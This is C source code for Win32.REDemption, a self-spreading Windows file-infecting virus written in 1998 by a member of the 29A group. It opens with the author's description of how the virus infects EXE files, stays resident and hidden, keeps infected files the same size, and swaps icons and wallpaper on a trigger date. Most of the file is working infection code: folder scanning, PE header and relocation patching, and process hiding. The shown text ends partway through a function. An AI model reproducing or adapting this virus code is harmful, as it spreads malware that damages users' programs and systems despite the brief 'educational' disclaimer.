????????????????????????????????????????????????????????????????[win32red.c]??
/*
Win32.REDemption.9216 virus.
(c) 1998. Jacky Qwerty/29A.

Description

This is a resident HLL (High Level Language) Win32 appender virus
written in C. It infects all sort of EXE files: DOS EXE files, NE files,
PE files from Win32 (Win95/NT), etc. Infected files only spread in Win32
platforms, including Win3.x with Win32s subsystem. The virus infects
EXE files by changing the pointer at 3Ch in the MZ header which points
to the new EXE header (if any) placing another pointer to the virus own
PE header attached at the end of the file. When the virus executes, it
infects all EXE files from Windows, System and current folder. Then it
spawns itself as another task (thus staying resident), makes itself
invisible (thus becoming unloadable) and periodically searches for non-
infected EXE files in all drives, infecting them in the background.

Most interesting feature of this virus is that infected files don't
grow at all, that is, files have same size before and after infection.
The virus compresses part of its host by using own JQCODING algorithm.
It also copies host icon to its own resource section to show original icon.
The virus has no problems related to finding the KERNEL32 base address
and its API functions. This is because all API functions are imported
implicitly from the virus own import table. The virus takes special care
of patching appropriately all RVA and RAW fields from its own PE header,
including code, data, imports, relocations and resource sections. This
is needed for the virus to spread succesfully through all kinds of hosts.

Payload

On October the 29th, the virus replaces the main icon of all infected
programs with its own icon, a 29A logo. It also changes default
desktop wallpaper to such logo.

To build

Just run the BUILD.BAT file to build release version. VC++ 6.0 compiler
was used since it proved to optimize better than Borland's or Watcom's.

Greets go to

All 29Aers..... for all the work quality and effort during this #3 issue,
		keep up the good work dudes!
b0z0........... for such invaluable feedback during betatesting, thanks
		a lot man, you rock!
My gf Carol.... who's been pushing me to quit the scene, but still not
		enough, i.o.u. #8).
Rajaat/Sandy... Hey we all miss you.. come back to 29A!

Disclaimer

This source code is provided for educational purposes only. The author is
NOT responsible in any way, for problems it may cause due to improper use!

(c) 1998. Jacky Qwerty/29A.
*/

#define WIN32_LEAN_AND_MEAN

#include 

#ifdef tsr
#include "win95sys.h"
#endif

#ifdef compr
#include "jqcoding.h"
#endif

#ifdef icon
#include "winicons.h"
#include "winres.h"
#endif


//constants..

#ifdef _MSC_VER 			       // Microsoft VC++
#  ifdef release
#    define DATA_SECTION_RAW	0x200  //0xE00
#  else
#    define DATA_SECTION_RAW	0x1400	//0x1600
#  endif
#  define COMPILER_DATA 	0  //0x30 (VC++4)
#  define SIZEOF_RESOURCE_DATA	0x504
#endif

#ifdef __BORLANDC__			       // Borland C++
#  ifdef release
#    define DATA_SECTION_RAW	?  //0x1000
#    define COMPILER_DATA	0
#  else
#    define DATA_SECTION_RAW	?  //0x6200
#    define COMPILER_DATA	0x74
#  endif
#  define SIZEOF_RESOURCE_DATA	?
#endif

#define VIRUS_SIZE	 (FILE_SIZE - PE_HEADER_OFFSET)

#define STARTOF_CODEDATA (DATA_SECTION_RAW + COMPILER_DATA -\
			    PE_HEADER_OFFSET)
#define RawSelfCheck	 (STARTOF_CODEDATA + sizeof(szCopyright) - 5)

#define INIT_VARS_OFFSET (STARTOF_CODEDATA + sizeof(szCopyright) +\
			    sizeof(szExts) + 3 & -4)
#ifdef tsr
#define RawProgType	 INIT_VARS_OFFSET
#define RawSrcVir	 (RawProgType + 4)
#else
#define RawSrcVir	 INIT_VARS_OFFSET
#endif
#define RawOldPtr2NewEXE (RawSrcVir + 4)
#define RawOldFileSize	 (RawOldPtr2NewEXE + 4)
#ifdef compr
#define RawnComprSize	 (RawOldFileSize + 4)
#define RawCipherTarget  (RawnComprSize + 4)
#define TmpVal RawCipherTarget
#else
#define TmpVal RawOldFileSize
#endif
#ifdef icon
#define RawOldResourceAddr  (TmpVal + 4)
#endif

#ifndef compr
#define SIZE_PAD	 101
#endif
#define READ_ONLY	 FALSE
#define WRITE_ACCESS	 TRUE
#define SIZEOF_FILEEXT	 3
#define MAX_FILESIZE	 0x4000000  //64 MB
#ifdef compr
#define MIN_FILESIZE	 0x4000     //16 KB
#endif
#define PREV_LAPSE	 3   //1 * 60  //10 * 60  //seconds
#define SEEK_LAPSE	 3   //5       //30	  //seconds


//macros..

#define Rva2Ptr(Type, Base, RVA) ((Type)((DWORD)(Base) + (DWORD)(RVA)))

#define IsFile(pFindData) (!((pFindData)->dwFileAttributes &\
			       FILE_ATTRIBUTE_DIRECTORY))
#define IsFolder(pFindData) (!IsFile(pFindData) &&\
				(pFindData)->cFileName[0] != '.')

#define PushVar(Object) __asm push (Object)
#define PopVar(Object) __asm pop (Object)


//type definitions..

#ifdef tsr
typedef BYTE PROG_TYPE, *PPROG_TYPE;
#define TSR_COPY	0
#define HOST_COPY	1
#endif

typedef BYTE BOOLB;

typedef struct _IMAGE_RELOCATION_DATA {  // not defined in winnt.h
  WORD RelocOffset :12;
  WORD RelocType   :4;
} IMAGE_RELOCATION_DATA, *PIMAGE_RELOCATION_DATA;

#ifdef icon
typedef struct _ICONIMAGES {
  PICONIMAGE pLargeIcon;
  PICONIMAGE pSmallIcon;
} ICONIMAGES, *PICONIMAGES;
#endif


//global variables..

BYTE szCopyright[] = "(c) Win32.REDemption (C ver.1.0) by JQwerty/29A",
     szExts[] = "eXeSCr";
#ifdef tsr
PROG_TYPE ProgType = HOST_COPY;
#endif
DWORD SrcVir = PE_HEADER_OFFSET, OldPtr2NewEXE = 1, OldFileSize = FILE_SIZE;
#ifdef compr
DWORD nComprSize = 1, CipherTarget = 1;
#endif
#ifdef icon
DWORD OldResourceAddr = RESOURCE_SECTION_RVA;
#include "jq29aico.h"
#endif
DWORD ExitCode = 0;
#ifndef compr
DWORD _TgtVir;
#else
DWORD CipherSource;
#endif
DWORD _RvaDelta;
HANDLE hHandle1, hHandle2;
BYTE PathName[MAX_PATH], HostName[MAX_PATH], TmpName[MAX_PATH];
WIN32_FIND_DATA FindData, FindDataTSR;
STARTUPINFO StartupInfo = { 0 };
PROCESS_INFORMATION ProcessInfo;
PIMAGE_DOS_HEADER pMZ, pHostMZ;
PIMAGE_NT_HEADERS _pHostPE;
#ifdef msgbox
BOOLB CancelFolderSeek = FALSE, CancelFileSeek = FALSE;
#ifdef tsr
HANDLE hMutex;
#endif
#endif
#ifdef icon
BOOLB bPayLoadDay = FALSE;
PIMAGE_RESOURCE_DIRECTORY pRsrcStart;
BYTE HostLargeIcon[SIZEOF_LARGE_ICON];
BYTE HostSmallIcon[SIZEOF_SMALL_ICON];
#endif
#ifdef compr
BYTE ComprMem[0x10000];
#ifdef icon
#define SIZEOF_BMP 0x8076 //32Kb + Bitmap header..
BYTE jq29aBmp[SIZEOF_BMP] = { 0 };
#endif
#endif

#define sz29A (szCopyright + sizeof(szCopyright) - 4)
#define szJQ (szCopyright + sizeof(szCopyright) - 12)


//function declarations..

VOID  Win32Red(VOID);
BOOLB OpenMapFile(PBYTE FileName, BOOLB WriteAccess);
VOID  CloseTruncFile(BOOLB WriteAccess);
VOID  InfectPath(PBYTE PathName, DWORD cBytes);
VOID  CloseUnmapFile(BOOLB WriteAccess);
PBYTE GetEndOfPath(PBYTE pTgt, PBYTE pSr);
PVOID Rva2Raw(DWORD Rva);
#ifdef icon
VOID  FixResources(PIMAGE_RESOURCE_DIRECTORY pRsrcDir);
VOID  GetDefaultIcons(PICONIMAGES pIconImages,
		      PVOID pNEorPE);
#endif
#ifdef tsr
VOID  ExecTemp(PROG_TYPE ProgType);
__inline VOID  SeekTSR(VOID);
VOID  WalkFolder(PBYTE PathName);
VOID  HideProcess(VOID);
__inline PPROCESS_DATABASE GetProcessDB(VOID);
__inline PTHREAD_DATABASE  GetThreadDB(VOID);
#else
__inline VOID ExecTemp(VOID);
#endif


//function definitions..

VOID Win32Red() {
  #ifdef tsr
  #ifndef msgbox
    HANDLE hMutex;
  #endif
  HideProcess();
  #endif
  #ifdef icon
  #include "payload.c"
  #endif
  if (GetModuleFileName(0, HostName, MAX_PATH) &&
      OpenMapFile(HostName, READ_ONLY)) {
    pHostMZ = pMZ;
    PushVar(hHandle1);	//better pushin/popin than usin a temp. var.
    PushVar(hHandle2);	//better pushin/popin than usin a temp. var.
    SrcVir += (DWORD)pMZ;
    #ifdef tsr
    if (ProgType != TSR_COPY) {
      #ifdef msgbox
      MessageBox(NULL, "Non-resident stage..", szCopyright, MB_OK);
      #endif
    #endif
      #ifdef compr
      PushVar(nComprSize);
      PushVar(CipherTarget);
      #endif
      InfectPath(PathName, GetWindowsDirectory(PathName, 0x7F));
      InfectPath(PathName, GetSystemDirectory(PathName, 0x7F));
      InfectPath(PathName, (*PathName = '.', 1));
      #ifdef compr
      PopVar(CipherTarget);
      PopVar(nComprSize);
      #endif
    #ifdef tsr
    }
    else {
      if ((hMutex = CreateMutex(NULL, FALSE, szJQ)))
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	#if 1
	#ifdef msgbox
	  MessageBox(NULL, "TSR: Mutex exists!", szCopyright, MB_OK),
	#endif
	#endif
	  CloseHandle(hMutex),
	  ExitProcess(ExitCode);
	#if 1
	#ifdef msgbox
	else
	  MessageBox(NULL, "TSR: Mutex created!", szCopyright, MB_OK);
	#endif
	#endif
      #ifdef msgbox
      MessageBox(NULL, "Resident stage..", szCopyright, MB_OK);
      #endif
      SeekTSR();
      #ifdef msgbox
      MessageBox(NULL, "TSR: bye bye..", szCopyright, MB_OK);
      #endif
    }
    #endif
    PopVar(hHandle2);	//better pushin/popin than usin a temp. var.
    PopVar(hHandle1);	//better pushin/popin than usin a temp. var.
    pMZ = pHostMZ;
    CloseUnmapFile(READ_ONLY);
    #ifdef tsr
    if (ProgType != TSR_COPY) {
      if ((hMutex = OpenMutex(MUTEX_ALL_ACCESS, FALSE, szJQ)))
	#ifndef msgbox
	CloseHandle(hMutex);
	#else
	CloseHandle(hMutex),
	MessageBox(NULL, "HOST: Mutex exists!", szCopyright, MB_OK);
	#endif
      else
	if (GetTempPath(MAX_PATH, PathName) - 1 < MAX_PATH - 1)
	  #ifdef msgbox
	  MessageBox(NULL, "HOST: Mutex doesn't exist!",
		     szCopyright, MB_OK),
	  #endif
	  ExecTemp(TSR_COPY);
      GetEndOfPath(PathName, HostName);
      ExecTemp(HOST_COPY);
    }
    #else
    GetEndOfPath(PathName, HostName);
    ExecTemp();
    #endif
  }
  ExitProcess(ExitCode);
}

#ifdef tsr
VOID ExecTemp(PROG_TYPE ProgType) {
#else
__inline VOID ExecTemp() {
#endif
  PBYTE pSrc, szCmdLine;
  HANDLE hFindFile;
  #ifdef compr
  BOOLB DecomprOK = TRUE;
  #endif
  #ifdef tsr
  DWORD cBytes;
  if (ProgType == TSR_COPY) {
    if (PathName[(cBytes = lstrlen(PathName)) - 1] != '\\')
      PathName[cBytes++] = '\\';
    *(PDWORD)(PathName + cBytes) = '*A92';
    *(PDWORD)(PathName + cBytes + 4) = '*.';
    if ((hFindFile = FindFirstFile(PathName, &FindData)) !=
	  INVALID_HANDLE_VALUE) {
      do {
	lstrcpy(PathName + cBytes, FindData.cFileName);
	DeleteFile(PathName);
      } while (FindNextFile(hFindFile, &FindData));
      FindClose(hFindFile);
    }
    PathName[cBytes] = '\x0';
  }
  #endif
  if (!(cBytes = lstrlen(PathName),
	GetTempFileName(PathName, sz29A, 0, PathName)) &&
      (GetTempPath(MAX_PATH, PathName) - 1 >= MAX_PATH - 1 ||
      !(cBytes = lstrlen(PathName),
	GetTempFileName(PathName, sz29A, 0, PathName))))
    return;
  if (ProgType != TSR_COPY)
  for (;;) {
    pSrc = PathName + lstrlen(lstrcpy(TmpName, PathName));
    while (*--pSrc != '.'); *(PDWORD)(pSrc + 1) = 'EXE';
    if (MoveFile(TmpName, PathName))
      break;
    DeleteFile(TmpName);
    PathName[cBytes] = '\x0';
    if (!GetTempFileName(PathName, sz29A, 0, PathName))
      return;
  }
  if (CopyFile(HostName, PathName, FALSE) &&
      SetFileAttributes(PathName, FILE_ATTRIBUTE_NORMAL) &&
      (hFindFile = FindFirstFile(HostName, &FindData)) !=
	INVALID_HANDLE_VALUE) {
    if (OpenMapFile(PathName, WRITE_ACCESS)) {
      #ifdef tsr
      if (ProgType != TSR_COPY) {
      #endif
	pMZ->e_lfanew = OldPtr2NewEXE;
	#ifndef compr
	FindData.nFileSizeLow = OldFileSize;
	#else
	#ifdef msgbox
	#if 0
	MessageBox(NULL, "Host decoding is about to start..",
		   szCopyright, MB_OK);
	#endif
	#endif
	if (jq_decode(Rva2Ptr(PBYTE, pMZ, OldFileSize),
		      Rva2Ptr(PBYTE, pMZ, CipherTarget + nComprSize),
		      nComprSize,
		      ComprMem) != OldFileSize - CipherTarget) {
	  DecomprOK = FALSE;
	  #ifdef msgbox
	  #if 1
	  MessageBox(NULL, "Decode error: File is corrupt!",
		     szCopyright, MB_OK);
	  #endif
	  #if 0
	}
	else {
	  MessageBox(NULL, "Host decoded succesfully!",
		     szCopyright, MB_OK);
	  #endif
	  #endif
	}
	#endif
      #ifdef tsr
      }
      else
	*Rva2Ptr(PPROG_TYPE,
		 Rva2Ptr(PIMAGE_NT_HEADERS, pMZ, pMZ->e_lfanew),
		 RawProgType) = TSR_COPY;
      #endif
      #ifndef compr
      UnmapViewOfFile(pMZ);
      CloseTruncFile(WRITE_ACCESS);
      #else
      CloseUnmapFile(WRITE_ACCESS);
      if (DecomprOK) {
      #endif
      pSrc = GetCommandLine(); while (*++pSrc != 0x20 && *pSrc);
      if ((szCmdLine = (PBYTE)GlobalAlloc(LPTR, MAX_PATH
						  + lstrlen(pSrc) + 1))) {
	lstrcat(lstrcpy(szCmdLine, PathName), pSrc);
	(BYTE)StartupInfo.cb = sizeof(STARTUPINFO);
	if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE,
			  CREATE_NEW_CONSOLE, NULL, NULL,
			  &StartupInfo, &ProcessInfo)) {
	  #ifdef tsr
	  if (ProgType != TSR_COPY) {
	  #endif
	    WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
	    GetExitCodeProcess(ProcessInfo.hProcess, &ExitCode);
	    CloseHandle(ProcessInfo.hThread);
	    CloseHandle(ProcessInfo.hProcess);
	  #ifdef tsr
	  }
	  #endif
	}
	GlobalFree(szCmdLine);
      }
      #ifdef compr
      }
      #endif
    }
    FindClose(hFindFile);
  }
  DeleteFile(PathName);
}

BOOLB OpenMapFile(PBYTE FileName, BOOLB WriteAccess) {
  #ifndef compr
  DWORD NewFileSize;
  #endif
  hHandle1 = CreateFile(FileName,
			WriteAccess
			  ? GENERIC_READ | GENERIC_WRITE
			  : GENERIC_READ,
			FILE_SHARE_READ,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0);
  if (hHandle1 == INVALID_HANDLE_VALUE)
    return FALSE;
  hHandle2 = CreateFileMapping(hHandle1,
			       NULL,
			       WriteAccess ? PAGE_READWRITE : PAGE_READONLY,
			       0,
			       #ifdef compr
			       0,
			       #else
			       WriteAccess
				 ? NewFileSize =
				     (((_TgtVir =
					 (FindData.nFileSizeLow + 0x1FF &
					   -0x200)
					 + PE_HEADER_OFFSET)
				       + (VIRUS_SIZE + SIZE_PAD - 1))
				     / SIZE_PAD) * SIZE_PAD
				 : 0,
			       #endif
			       NULL);
  if (!hHandle2) {
    CloseHandle(hHandle1);
    return FALSE;
  }
  pMZ = MapViewOfFile(hHandle2,
		      WriteAccess ? FILE_MAP_WRITE : FILE_MAP_READ,
		      0,
		      0,
		      #ifdef compr
		      0
		      #else
		      WriteAccess ? NewFileSize : 0
		      #endif
		     );
  if (!pMZ) {
    CloseTruncFile(WriteAccess);
    return FALSE;
  }
  return TRUE;
}

VOID CloseTruncFile(BOOLB WriteAccess) {
  CloseHandle(hHandle2);
  if (WriteAccess) {
    #ifndef compr
    SetFilePointer(hHandle1, FindData.nFileSizeLow, NULL, FILE_BEGIN);
    SetEndOfFile(hHandle1);
    #endif
    SetFileTime(hHandle1, NULL, NULL, &FindData.ftLastWriteTime);
  }
  CloseHandle(hHandle1);
}

VOID InfectPath(PBYTE PathName, DWORD cBytes) {
  PBYTE pSrc, pTgt, pExt, pEndRelocs, pRelocBase;
  #ifdef compr
  PBYTE pComprBuf;
  SYSTEMTIME SystemTime;
  #endif
  DWORD FileExt, TgtVir, RvaDelta, RawDelta, nCount, nSections, nRvas;
  PIMAGE_SECTION_HEADER pSectionHdr;
  PIMAGE_NT_HEADERS pPE, pHostPE;
  PIMAGE_BASE_RELOCATION pRelocs;
  PIMAGE_RELOCATION_DATA pRelocData;
  PIMAGE_IMPORT_DESCRIPTOR pImports;
  PIMAGE_THUNK_DATA pImportData;
  HANDLE hFindFile;
  BOOLB Infect, bValidHeader;
  #ifdef icon
  ICONIMAGES IconImages;
  #endif
  if (0x7F <= cBytes - 1) return;
  if (PathName[cBytes - 1] != '\\') PathName[cBytes++] = '\\';
  *(PDWORD)(PathName + cBytes) = '*.*';
  #ifdef msgbox
  switch (MessageBox(NULL, PathName, szCopyright,
		     MB_YESNOCANCEL | MB_ICONEXCLAMATION)) {
    case IDCANCEL:
      CancelFolderSeek = TRUE;
    case IDNO:
      return;
  }
  #endif
  if ((hFindFile = FindFirstFile(PathName, &FindData)) ==
	INVALID_HANDLE_VALUE)
    return;
  do {
    {
    #ifdef compr
    BYTE KeySecond, TmpKeySec;
    #endif
    if (!IsFile(&FindData) || FindData.nFileSizeHigh ||
	#ifdef compr
	FindData.nFileSizeLow < MIN_FILESIZE ||
	#endif
	(FindData.nFileSizeLow & -MAX_FILESIZE) ||
	#ifndef compr
	!(FindData.nFileSizeLow % SIZE_PAD)
	#else
	(FileTimeToSystemTime(&FindData.ftLastWriteTime, &SystemTime),
	TmpKeySec =
	  (BYTE)(((BYTE)SystemTime.wYear - (BYTE)SystemTime.wMonth +
		  (BYTE)SystemTime.wDay - (BYTE)SystemTime.wHour +
		  (BYTE)SystemTime.wMinute ^ 0x6A) & 0x3E),
	 KeySecond = TmpKeySec < 60 ? TmpKeySec : TmpKeySec - 4,
	 KeySecond == (BYTE)SystemTime.wSecond)
	#endif
       )
      continue;
    #ifdef compr
    (BYTE)SystemTime.wSecond = KeySecond;
    #endif
    }
    pTgt = lstrcpy(PathName + cBytes, FindData.cFileName)
	     + lstrlen(FindData.cFileName);
    FileExt = *(PDWORD)(pTgt - SIZEOF_FILEEXT) & ~0xFF202020;
    pExt = szExts;
    do {
      if (FileExt != (*(PDWORD)pExt & ~0xFF202020) ||
	  pTgt[- 1 - SIZEOF_FILEEXT] != '.' ||
	  !OpenMapFile(PathName, READ_ONLY))
	continue;
      Infect = FALSE;
      #ifdef compr
      pComprBuf = NULL;
      #endif
      if (pMZ->e_magic == IMAGE_DOS_SIGNATURE) {
	bValidHeader = FALSE;
	pPE = Rva2Ptr(PIMAGE_NT_HEADERS, pMZ, pMZ->e_lfanew);
	if ((DWORD)pMZ < (DWORD)pPE &&
	    (DWORD)pPE < Rva2Ptr(DWORD,
				 pMZ,
				 FindData.nFileSizeLow)
			 - 0x7F &&
	    (bValidHeader = TRUE,
	     pPE->Signature == IMAGE_NT_SIGNATURE &&
	     *Rva2Ptr(PDWORD, pPE, RawSelfCheck) == 'A92/')) {
	} else {
	  #ifndef compr
	    Infect = TRUE;
	  #else
	  {
	  DWORD nMaxComprSize;
	  if ((pComprBuf =
		 (PBYTE)GlobalAlloc(
			  LPTR,
			  nMaxComprSize =
			    FindData.nFileSizeLow / 8 * 9 + 12
			)
	      )) {
	    #ifdef msgbox
	    #if 0
	    MessageBox(NULL, "Host encoding is about to start..",
		       FindData.cFileName, MB_OK);
	    #endif
	    #endif
	    nComprSize =
	      jq_encode(pComprBuf + nMaxComprSize,
			Rva2Ptr(PBYTE, pMZ, FindData.nFileSizeLow),
			FindData.nFileSizeLow - sizeof(IMAGE_DOS_HEADER),
			ComprMem);
	    TgtVir = (CipherTarget + nComprSize - PE_HEADER_OFFSET
		       + 0x1FF & -0x200) + PE_HEADER_OFFSET;
	    if (TgtVir + VIRUS_SIZE - 1 < FindData.nFileSizeLow)
	      #ifdef msgbox
	      #if 0
	      MessageBox(NULL, "Host encoded succesfully!",
			 FindData.cFileName, MB_OK),
	      #endif
	      #endif
	      Infect = TRUE;
	    #ifdef msgbox
	    #if 0
	    else
	      MessageBox(NULL, "Host encoded succesfully, but "
			       "Win32.RED code didn't fit, "
			       "skipping file..",
			 FindData.cFileName, MB_OK);
	    #endif
	    #endif
	  }
	  }
	  #endif
	}
      }
      CloseUnmapFile(READ_ONLY);
      if (!Infect || !SetFileAttributes(PathName, FILE_ATTRIBUTE_NORMAL)) {
	#ifdef compr
	if (pComprBuf) GlobalFree(pComprBuf);
	#endif
	continue;
      }
      #ifdef msgbox
      switch (MessageBox(NULL, PathName, szCopyright,
			 MB_YESNOCANCEL | MB_ICONEXCLAMATION)) {
	case IDCANCEL:
	  CancelFileSeek = TRUE; break;
	case IDYES:
      #endif
      if (OpenMapFile(PathName, WRITE_ACCESS)) {
	#ifdef icon
	IconImages.pLargeIcon = NULL;
	IconImages.pSmallIcon = NULL;
	if (!bPayLoadDay && bValidHeader) {
	  GetDefaultIcons(&IconImages,
			  Rva2Ptr(PVOID, pMZ, pMZ->e_lfanew));
	  if (IconImages.pLargeIcon) {
	    pSrc = (PBYTE)IconImages.pLargeIcon;
	    pTgt = HostLargeIcon;
	    nCount = SIZEOF_LARGE_ICON;
	    do *pTgt++ = *pSrc++; while (--nCount);
	    if (IconImages.pSmallIcon) {
	      pSrc = (PBYTE)IconImages.pSmallIcon;
	      nCount = SIZEOF_SMALL_ICON;
	      do *pTgt++ = *pSrc++; while (--nCount);
	    }
	  }
	}
	#endif
	#ifdef compr
	pTgt = Rva2Ptr(PBYTE, pMZ, CipherTarget);
	pSrc = (PBYTE)CipherSource;
	nCount = nComprSize;
	do *pTgt++ = *pSrc++; while (--nCount);
	GlobalFree(pComprBuf); pComprBuf = NULL;  //This line is optional
	_pHostPE = pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS,
				     pMZ,
				     TgtVir);
	#else
	_pHostPE = pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS, //The comented code
				     pMZ,		//  below generates
				     TgtVir = _TgtVir); //  more bytez than
	#endif						//  this code becoz
	pTgt = (PBYTE)pHostPE;				//  the linker adds
	pSrc = (PBYTE)SrcVir;				//  other functionz
	nCount = VIRUS_SIZE;				//  not needed!
	do *pTgt++ = *pSrc++; while (--nCount); 	//

//	  CopyMemory((PBYTE)(pHostPE = Rva2Ptr(PIMAGE_NT_HEADERS, //Not in
//					       pMZ,		  //any DLL
//					       TgtVir)),	  //but in
//		     (PBYTE)SrcVir,				  //a RTL.
//		     VIRUS_SIZE);				  //

	#ifdef tsr
	if (ProgType == TSR_COPY)
	  *Rva2Ptr(PPROG_TYPE, pHostPE, RawProgType) = HOST_COPY;
	#endif
	*Rva2Ptr(PDWORD, pHostPE, RawSrcVir) = TgtVir;
	*Rva2Ptr(PDWORD, pHostPE, RawOldPtr2NewEXE) = pMZ->e_lfanew;
	*Rva2Ptr(PDWORD, pHostPE, RawOldFileSize) = FindData.nFileSizeLow;
	#ifdef compr
	*Rva2Ptr(PDWORD, pHostPE, RawnComprSize) = nComprSize;
	*Rva2Ptr(PDWORD, pHostPE, RawCipherTarget) = CipherTarget;
	#endif

	_RvaDelta = RvaDelta =
	  ((pHostPE->OptionalHeader.SizeOfHeaders +=
	      (RawDelta = TgtVir - pHostMZ->e_lfanew))
	    + 0xFFF & -0x1000)
	  - pHostPE->OptionalHeader.BaseOfCode;

	// fix RVAs in PE header..

	pHostPE->OptionalHeader.AddressOfEntryPoint += RvaDelta;
	pHostPE->OptionalHeader.BaseOfCode += RvaDelta;
	pHostPE->OptionalHeader.BaseOfData += RvaDelta;
	pSectionHdr = IMAGE_FIRST_SECTION(pHostPE);
	nSections = pHostPE->FileHeader.NumberOfSections;
	do {
	  pSectionHdr->PointerToRawData += RawDelta;
	  pSectionHdr++->VirtualAddress += RvaDelta;
	} while (--nSections);
	pHostPE->OptionalHeader.SizeOfImage =
	  (pSectionHdr - 1)->VirtualAddress
	  + (pSectionHdr - 1)->Misc.VirtualSize
	  + 0xFFF & -0x1000;
	nRvas = pHostPE->OptionalHeader.NumberOfRvaAndSizes;
	do {
	  if (!pHostPE->OptionalHeader.DataDirectory[--nRvas].
			VirtualAddress)
	    continue;
	  pHostPE->OptionalHeader.DataDirectory[nRvas].
		   VirtualAddress += RvaDelta;
	} while (nRvas);

	// fix RVAs in code & reloc section..

	pEndRelocs =
	  Rva2Ptr(
	    PBYTE,
	    (pRelocs =
	       Rva2Raw(pHostPE->OptionalHeader.
		       DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
		       VirtualAddress)),
	    pHostPE->OptionalHeader.
		     DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].
		     Size - IMAGE_SIZEOF_BASE_RELOCATION);
	do {
	  pRelocBase = Rva2Raw(pRelocs->VirtualAddress += RvaDelta);
	  pRelocData = (PIMAGE_RELOCATION_DATA)(pRelocs + 1);
	  (DWORD)pRelocs += pRelocs->SizeOfBlock;
	  do {
	    if (pRelocData->RelocType != IMAGE_REL_BASED_HIGHLOW)
	      continue;
	    *Rva2Ptr(PDWORD,
		     pRelocBase,
		     pRelocData->RelocOffset) += RvaDelta;
	  } while ((DWORD)++pRelocData < (DWORD)pRelocs);
	} while ((DWORD)pRelocs < (DWORD)pEndRelocs);

	// fix RVAs in import section..

	pImports =
	  Rva2Raw(pHostPE->OptionalHeader.
			   DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].
			   VirtualAddress);
	do {
	  pImportData =
	    #ifdef _MSC_VER
	    Rva2Raw((DWORD)pImports->OriginalFirstThunk += RvaDelta);
	    #endif
	    #ifdef __BORLANDC__
	    Rva2Raw((DWORD)pImports->u.OriginalFirstThunk += RvaDelta);
	    #endif
	  if ((DWORD)pImportData)
	    do {
	      (DWORD)pImportData->u1.AddressOfData += RvaDelta;
	    } while ((DWORD)(++pImportData)->u1.AddressOfData);
	  pImports->Name += RvaDelta;
	  pImportData = Rva2Raw((DWORD)pImports->FirstThunk += RvaDelta);
	  do {
	    (DWORD)pImportData->u1.AddressOfData += RvaDelta;
	  } while ((DWORD)(++pImportData)->u1.AddressOfData);
	} while((++pImports)->Name);

	#ifdef icon
	// fix RVAs in resource section..

	pRsrcStart =
	  Rva2Raw(pHostPE->OptionalHeader.
			   DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
			   VirtualAddress = (*Rva2Ptr(PDWORD,
						      pHostPE,
						      RawOldResourceAddr)
					       += RvaDelta));
	((PBYTE)pRsrcStart)[0x2E] = 2;
	((PBYTE)pRsrcStart)[0x4E4] = 2;
	FixResources(pRsrcStart);

	if (IconImages.pLargeIcon || bPayLoadDay) {
	  pHostPE->OptionalHeader.
		   DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
		   Size = SIZEOF_RESOURCE_DATA;
	  pTgt = (PBYTE)pRsrcStart + 0xD0;
	  pSrc = HostLargeIcon;
	  nCount = SIZEOF_LARGE_ICON;
	  do *pTgt++ = *pSrc++; while (--nCount);
	  if (IconImages.pSmallIcon || bPayLoadDay) {
	    nCount = SIZEOF_SMALL_ICON;
	    do *pTgt++ = *pSrc++; while (--nCount);
	  }
	  else {
	    ((PBYTE)pRsrcStart)[0x2E] = 1;
	    ((PBYTE)pRsrcStart)[0x4E4] = 1;
	  }
	}
	else {
	  pHostPE->OptionalHeader.
		   DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
		   VirtualAddress = 0;
	  pHostPE->OptionalHeader.
		   DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].
		   Size = 0;
	}
	#endif

	pMZ->e_lfanew = TgtVir;
	#ifdef compr
	SystemTimeToFileTime(&SystemTime, &FindData.ftLastWriteTime);
	#endif
	CloseUnmapFile(WRITE_ACCESS);
      }
      #ifdef msgbox
      }
      #endif
      SetFileAttributes(PathName, FindData.dwFileAttributes);
      #ifdef msgbox
      if (CancelFileSeek) {
	CancelFileSeek = FALSE;
	goto BreakHere;  //can't use break; because of the 2 while's.
      }
      #endif
      #ifdef compr
      if (pComprBuf) GlobalFree(pComprBuf);
      #endif
    } while (*(pExt += SIZEOF_FILEEXT));
  } while (FindNextFile(hFindFile, &FindData));
  #ifdef msgbox
  BreakHere:
  #endif
  FindClose(hFindFile);
}

VOID CloseUnmapFile(BOOLB WriteAccess) {
  UnmapViewOfFile(pMZ);
  #ifndef compr
  CloseHandle(hHandle2);
  if (WriteAccess)
    SetFileTime(hHandle1, NULL, NULL, &FindData.ftLastWriteTime);
  CloseHandle(hHandle1);
  #else
  CloseTruncFile(WriteAccess);
  #endif
}

PBYTE GetEndOfPath(PBYTE pTgt, PBYTE pSr) {
  PBYTE pTgtBegin = pTgt, pSrEnd = pSr;
  while (*pSrEnd++);
  while (pSr < --pSrEnd && pSrEnd[-1] != '\\' && pSrEnd[-1] != ':');
  while (pSr < pSrEnd) *pTgt++ = *pSr++;
  if (pTgtBegin == pTgt || pTgt[-1] != '\\') *((PWORD)pTgt)++ = '.\\';
  *pTgt = '\x0'; return(pTgt);
}

PVOID Rva2Raw(DWORD Rva) {
  PIMAGE_SECTION_HEADER pSectionHdr = IMAGE_FIRST_SECTION(_pHostPE);
  DWORD nSections = _pHostPE->FileHeader.NumberOfSections;
  do {
    if (pSectionHdr->VirtualAddress <= Rva &&
	Rva < pSectionHdr->VirtualAddress + pSectionHdr->Misc.VirtualSize)
      return (PVOID)(Rva - pSectionHdr->VirtualAddress
		     + pSectionHdr->PointerToRawData
		     + (DWORD)pMZ);
    pSectionHdr++;
  } while (--nSections);
  return NULL;
}

#ifdef icon
VOID FixResources(PIMAGE_RESOURCE_DIRECTORY pRsrcDir) {
  PIMAGE_RESOURCE_DIRECTORY_ENTRY pRsrcDirEntry;
  DWORD nCount;
  if (!pRsrcDir)
    return;
